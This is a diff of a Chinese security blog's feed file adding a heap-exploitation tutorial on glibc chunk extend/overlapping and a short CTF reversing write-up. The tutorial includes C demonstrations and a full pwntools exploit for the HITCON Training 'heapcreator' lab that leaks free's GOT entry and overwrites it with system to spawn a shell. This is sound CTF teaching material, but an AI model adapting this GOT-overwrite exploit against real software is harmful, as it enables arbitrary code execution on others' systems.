@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>堆溢出-Chunk Extend and Overlapping</title>
+      <link href="/%E5%A0%86%E6%BA%A2%E5%87%BA-Chunk%20Extend%20and%20Overlapping/"/>
+      <url>/%E5%A0%86%E6%BA%A2%E5%87%BA-Chunk%20Extend%20and%20Overlapping/</url>
+      
+        <content type="html"><![CDATA[<h1 id="堆溢出-Chunk-Extend-and-Overlapping"><a href="#堆溢出-Chunk-Extend-and-Overlapping" class="headerlink" title="堆溢出-Chunk Extend and Overlapping"></a>堆溢出-Chunk Extend and Overlapping</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><p>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><blockquote><p>作用</p></blockquote><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h2><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>当把chunk 1 size改为0x41(0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小)，chunk 2被chunk 1包含进去，，当把chunk1释放时chunk2被一同释放，再申请一个比chunk1大的块就能直接控制chunk2(不要覆盖top chunk)，称为 overlapping chunk。</p><h2 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h2><p>处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。（fastbin 默认的最大的 chunk 可使用范围是 0x70）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1     大小 &gt; fastbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;   <span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin，再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容。</p><h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>首先释放 chunk1 使它进入 unsorted bin 中，然后篡改 chunk1 的 size 域，此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc(0x10)申请的都是fastbin。</p><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h2 id="例-HITCON-Trainging-lab13"><a href="#例-HITCON-Trainging-lab13" class="headerlink" title="例 HITCON Trainging lab13"></a>例 HITCON Trainging lab13</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"          Heap Creator          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Show a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 5. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">( heaparray[v1] )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">    read_input(*(heaparray[v1] + <span class="number">1</span>), *heaparray[v1] + <span class="number">1L</span>L);   <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol><li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li><li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>break *0x400D76</p><p>创建两个大小为0x14的堆块，heap命令查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603290</span><br><span class="line">0x603290:0x00000000000000000x0000000000000021  ===&gt;chunk1</span><br><span class="line">0x6032a0:0x00000000000000140x00000000006032c0  指向</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000021  ===&gt;chunk1数据</span><br><span class="line">0x6032c0:0x61616161616161610x6161616161616161  长度0x14</span><br><span class="line">0x6032d0:0x00000000616161610x0000000000000021  ===&gt;chunk2</span><br><span class="line">0x6032e0:0x00000000000000140x0000000000603300</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000021  ===&gt;chunk2数据</span><br><span class="line">0x603300:0x62626262626262620x6262626262626262  长度0x14</span><br><span class="line">0x603310:0x00000000626262620x0000000000020cf1  ===&gt;top chunk</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>因此堆中保存的结构为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------------------</span><br><span class="line">chunk1 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br><span class="line">chunk2 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure><p>可见如果我们数据的长度为0x18，调用edit_heap就可触发off-by-one覆盖下一堆块的prev_size</p><p>一个chunk在被free掉之后存在bins中，其头部含有prev_size和size，但一旦malloc后，这个prev_size就没用了，它只用来记录前一个空闲块的大小。因此如果malloc0x18个字节的话多出8个字节没有对齐，会将这个prev_size也当做data段的部分分配出去，而不是下一个堆了。</p><p>接下来就是利用<strong>通过 extend 后向 overlapping+fastbin</strong>实现利用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment"># chunk1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment"># chunk3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)<span class="comment"># 0x18,  off-by-one</span></span><br><span class="line">delete(<span class="number">1</span>)             <span class="comment"># 通过 extend 后向 overlapping</span></span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])<span class="comment">#这里的size涉及到后面修改地址时需要多长的字节</span></span><br><span class="line">create(<span class="number">0x70</span>,payload) <span class="comment">#重新创建chunk</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))  <span class="comment"># free_got地址</span></span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]  <span class="comment"># system地址</span></span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># free执行</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cn = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">lib = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(l,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    cn.sendline(str(int(l)))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    <span class="comment">#if index == 2:gdb.attach(cn)</span></span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    gdb.attach(cn)</span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"><span class="comment">#leak free addr</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(cn)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)</span><br><span class="line">gdb.attach(cn)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)<span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"><span class="comment">#trim free_got</span></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</a> bye</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>堆溢出-基本方法</title>
       <link href="/%E5%A0%86%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/"/>
       <url>/%E5%A0%86%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/</url>
@@ -520,6 +545,31 @@
     
     
     <entry>
+      <title>第八届swpu网络安全大赛逆向r2 r3</title>
+      <link href="/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/"/>
+      <url>/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="第八届swpu网络安全大赛逆向r2-r3"><a href="#第八届swpu网络安全大赛逆向r2-r3" class="headerlink" title="第八届swpu网络安全大赛逆向r2 r3"></a>第八届swpu网络安全大赛逆向r2 r3</h1><p>也是以前的题了</p><h2 id="R2：bin100"><a href="#R2：bin100" class="headerlink" title="R2：bin100"></a>R2：bin100</h2><p>打开程序<br><img src="https://i.loli.net/2018/09/04/5b8deefecd76d.jpg" alt></p><p>。。。。。什么也没有<br>尝试输入，输到16位后提醒重试<br>用OD打开</p><p>界面像是输序列号，正好在看雪论坛看到以下内容</p><p><img src="https://i.loli.net/2018/09/04/5b8def1d19c71.jpg" alt></p><p>于是查找windowtextA</p><p><img src="https://i.loli.net/2018/09/04/5b8def2d25c46.jpg" alt><br><img src="https://i.loli.net/2018/09/04/5b8def34d0fae.jpg" alt></p><p>一直F8，看到cmp，应该是判断输入是否满足16位<br>打开IDA ，F5看伪代码</p><p><img src="https://i.loli.net/2018/09/04/5b8def45a9635.jpg" alt></p><p>然后接下来应记下关键跳转的地址，在IDA中分析，<br>输入的数字经过一系列计算，最后与一个字符串对比<br>得出flag</p><h2 id="R3：bin200"><a href="#R3：bin200" class="headerlink" title="R3：bin200"></a>R3：bin200</h2><p>先查壳</p><p><img src="https://i.loli.net/2018/09/04/5b8defbc9e8a2.jpg" alt></p><p>VC++写的<br>先用IDA调试：<br>查找字符串，发现一串数字08067<br>跟随后F5</p><p><img src="https://i.loli.net/2018/09/04/5b8defccf0ede.jpg" alt></p><p>可以看到result=8，应该是要对比已通关数和总关数8<br>然后跟着往下发现对比的if语句，找到相等时的跳转的地址，在OD上找到这个地址，就可以找出flag</p><p>From <a href="https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/">https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/</a> bye</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>第三届上海市大学生网络安全大赛crackme</title>
       <link href="/%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bcrackme/"/>
       <url>/%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bcrackme/</url>
@@ -551,65 +601,11 @@
     
     
     <entry>
-      <title>第八届swpu网络安全大赛逆向r2 r3</title>
-      <link href="/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/"/>
-      <url>/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/</url>
-      
-        <content type="html"><![CDATA[<h1 id="第八届swpu网络安全大赛逆向r2-r3"><a href="#第八届swpu网络安全大赛逆向r2-r3" class="headerlink" title="第八届swpu网络安全大赛逆向r2 r3"></a>第八届swpu网络安全大赛逆向r2 r3</h1><p>也是以前的题了</p><h2 id="R2：bin100"><a href="#R2：bin100" class="headerlink" title="R2：bin100"></a>R2：bin100</h2><p>打开程序<br><img src="https://i.loli.net/2018/09/04/5b8deefecd76d.jpg" alt></p><p>。。。。。什么也没有<br>尝试输入，输到16位后提醒重试<br>用OD打开</p><p>界面像是输序列号，正好在看雪论坛看到以下内容</p><p><img src="https://i.loli.net/2018/09/04/5b8def1d19c71.jpg" alt></p><p>于是查找windowtextA</p><p><img src="https://i.loli.net/2018/09/04/5b8def2d25c46.jpg" alt><br><img src="https://i.loli.net/2018/09/04/5b8def34d0fae.jpg" alt></p><p>一直F8，看到cmp，应该是判断输入是否满足16位<br>打开IDA ，F5看伪代码</p><p><img src="https://i.loli.net/2018/09/04/5b8def45a9635.jpg" alt></p><p>然后接下来应记下关键跳转的地址，在IDA中分析，<br>输入的数字经过一系列计算，最后与一个字符串对比<br>得出flag</p><h2 id="R3：bin200"><a href="#R3：bin200" class="headerlink" title="R3：bin200"></a>R3：bin200</h2><p>先查壳</p><p><img src="https://i.loli.net/2018/09/04/5b8defbc9e8a2.jpg" alt></p><p>VC++写的<br>先用IDA调试：<br>查找字符串，发现一串数字08067<br>跟随后F5</p><p><img src="https://i.loli.net/2018/09/04/5b8defccf0ede.jpg" alt></p><p>可以看到result=8，应该是要对比已通关数和总关数8<br>然后跟着往下发现对比的if语句，找到相等时的跳转的地址，在OD上找到这个地址，就可以找出flag</p><p>From <a href="https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/">https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/</a> bye</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 逆向 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 逆向 </tag>
-            
